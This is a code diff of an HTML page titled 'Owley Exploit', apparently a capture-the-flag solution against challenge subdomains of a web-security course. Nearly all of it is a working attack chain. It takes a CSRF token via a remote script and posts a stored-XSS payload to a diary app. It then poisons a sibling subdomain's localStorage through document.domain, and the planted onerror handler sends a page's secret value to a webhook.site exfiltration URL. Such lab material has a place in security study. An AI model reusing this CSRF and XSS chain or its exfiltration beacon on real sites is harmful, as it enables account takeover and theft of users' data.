@@ -1,18 +1,53 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Test</title>
+    <title>Owley Exploit</title>
 </head>
 <body>
+    <!-- Hint 1 & 2: Outsource the attack and steal the token -->
+    <script src="https://owley-madison.jeopardy.websec.saarland/csrf_script.js"></script>
+
     <script>
-        // Use a standard string, no backticks, no external scripts.
-        var W = "https://webhook.site/3edd777c-81ed-4ac7-9380-bf960ab73bd2";
-        new Image().src = W + "/?event=ATOMIC_START";
-        
         window.onload = function() {
-            new Image().src = W + "/?event=ATOMIC_LOADED";
-            // Attempt to redirect to the diary immediately
-            location.href = "https://diary.owley-madison.jeopardy.websec.saarland/";
+            // 1. Grab the stolen token
+            var token = document.querySelector('input[name="csrfmiddlewaretoken"]').value;
+
+            // 2. The Diary Payload (The actual weapon)
+            // Hint 4: We set document.domain, open an iframe to 'match', and poison its storage.
+            var diaryXSS = "<script>\n" +
+                "document.domain = 'owley-madison.jeopardy.websec.saarland';\n" +
+                "var matchFrame = document.createElement('iframe');\n" +
+                "matchFrame.src = 'https://match.owley-madison.jeopardy.websec.saarland/';\n" +
+                "matchFrame.onload = function() {\n" +
+                "    var xssPayload = '</option><img src=x onerror=\"new Image().src=\\'https://webhook.site/3edd777c-81ed-4ac7-9380-bf960ab73bd2/?flag=\\'+encodeURIComponent(document.getElementById(\\'message\\').value)\">';\n" +
+                "    matchFrame.contentWindow.localStorage.setItem('favorites', JSON.stringify([xssPayload]));\n" +
+                "    window.location.href = 'https://chat.owley-madison.jeopardy.websec.saarland/';\n" +
+                "};\n" +
+                "document.body.appendChild(matchFrame);\n" +
+            "<\/script>";
+
+            // 3. Perform an action for the crawler (POST to Diary)
+            var form = document.createElement('form');
+            form.action = 'https://diary.owley-madison.jeopardy.websec.saarland/entry';
+            form.method = 'POST';
+
+            var inputContent = document.createElement('input');
+            inputContent.name = 'content';
+            inputContent.value = diaryXSS;
+            form.appendChild(inputContent);
+
+            var inputToken = document.createElement('input');
+            inputToken.name = 'csrfmiddlewaretoken';
+            inputToken.value = token;
+            form.appendChild(inputToken);
+
+            document.body.appendChild(form);
+            form.submit();
+
+            // 4. Redirect the bot to its diary to execute the payload
+            setTimeout(function() {
+                window.location.href = 'https://diary.owley-madison.jeopardy.websec.saarland/';
+            }, 600);
         };
     </script>
 </body>
